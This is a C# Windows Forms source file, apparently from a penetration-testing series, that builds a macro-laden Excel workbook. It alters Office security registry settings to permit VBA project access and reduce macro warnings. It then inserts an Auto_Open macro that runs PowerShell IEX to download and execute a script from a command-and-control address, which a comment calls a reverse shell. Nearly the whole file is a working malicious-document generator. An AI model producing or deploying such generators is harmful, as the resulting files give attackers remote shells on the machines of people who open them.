using Microsoft.Win32;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using VbIntrOP = Microsoft.Vbe.Interop;
using Excel = Microsoft.Office.Interop.Excel;
using System.Windows.Forms;

namespace ExcelMacroGUI
{
    public partial class ExcelMacroForm : Form
    {
        public ExcelMacroForm()
        {
            InitializeComponent();
        }

        private void btnExcelGen_Click(object sender, EventArgs e)
        {
            #region ExcelCreation
            Excel.Application xlApp = new Excel.Application();
            Excel.Workbook xlWorkBook;
            Excel.Worksheet xlWorkSheet;
            xlApp.DisplayAlerts = false;
            //xlApp.AutomationSecurity = Microsoft.Office.Core.MsoAutomationSecurity.msoAutomationSecurityForceDisable;
            xlWorkBook = xlApp.Workbooks.Add(true);
            xlWorkSheet = (Excel.Worksheet)xlWorkBook.ActiveSheet;

            if (xlWorkSheet == null)
            {
                MessageBox.Show("Failed to assign active worksheet");
            }
            #endregion

            #region Required Registry Changes
            string regpath = @"Software\Microsoft\Office\" + xlApp.Version + @"\Excel\Security";

            RegistryKey key = Registry.CurrentUser.OpenSubKey(regpath, true);
            if (key != null)
            {
                key.SetValue("AccessVBOM", "1", RegistryValueKind.DWord);
                key.SetValue("VBAWarnings", "1", RegistryValueKind.DWord);
                key.Close();
            }
            #endregion

            #region VBModule and Macro Creation

            VbIntrOP.VBComponent xlVBMod;
            xlVBMod = xlWorkBook.VBProject.VBComponents.Add(VbIntrOP.vbext_ComponentType.vbext_ct_StdModule);
            xlVBMod.Name = "OurMacro";

            //Our reverse shell powershell script will get loaded from our C&C.
            
            string strMacroRevShell = @"Sub Auto_Open()
 Call Shell(""cmd.exe /c powershell.exe IEX(IWR -uri 'http://192.168.1.75:443/getit.txt')"", 1)
 End Sub";

            xlVBMod.CodeModule.AddFromString(strMacroRevShell);
            #endregion

            #region SaveExcel and Release COM Objects
            string outpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName,txtSaveAs.Text+ ".xls");
            try
            {//save the workbook.
                xlWorkBook.SaveAs(outpath, Excel.XlFileFormat.xlExcel8, Missing.Value, Missing.Value, Missing.Value, Missing.Value, Excel.XlSaveAsAccessMode.xlNoChange, Missing.Value, Missing.Value, Missing.Value, Missing.Value, Missing.Value);
                MessageBox.Show("Excel with macro created", "C# Pentest VI", MessageBoxButtons.OK);
            }
            catch (Exception ex)
            {
                //Console.WriteLine(ex.Message);
                //release all memory - stop EXCEL.exe from hanging around.
                if (xlVBMod != null) { Marshal.ReleaseComObject(xlVBMod); }
                if (xlWorkBook != null) { Marshal.ReleaseComObject(xlWorkBook); }
                if (xlWorkSheet != null) { Marshal.ReleaseComObject(xlWorkSheet); }
                if (xlApp != null) { Marshal.ReleaseComObject(xlApp); }
                xlVBMod = null;
                xlWorkBook = null;
                xlWorkSheet = null;
                xlApp = null;
                GC.Collect();

                Environment.Exit(0);
            }
            finally
            {
                RegistryKey key2 = Registry.CurrentUser.OpenSubKey(regpath, true);
                if (key2 != null)
                {
                    key2.SetValue("AccessVBOM", "0", RegistryValueKind.DWord);
                    key2.SetValue("VBAWarnings", "0", RegistryValueKind.DWord);
                    key2.Close();
                }
                //release all memory - stop EXCEL.exe from hanging around.
                if (xlVBMod != null) { Marshal.ReleaseComObject(xlVBMod); }
                if (xlWorkBook != null) { Marshal.ReleaseComObject(xlWorkBook); }
                if (xlWorkSheet != null) { Marshal.ReleaseComObject(xlWorkSheet); }
                if (xlApp != null) { Marshal.ReleaseComObject(xlApp); }
                xlVBMod = null;
                xlWorkBook = null;
                xlWorkSheet = null;
                xlApp = null;
                GC.Collect();

            }
            #endregion
        }
    }
}
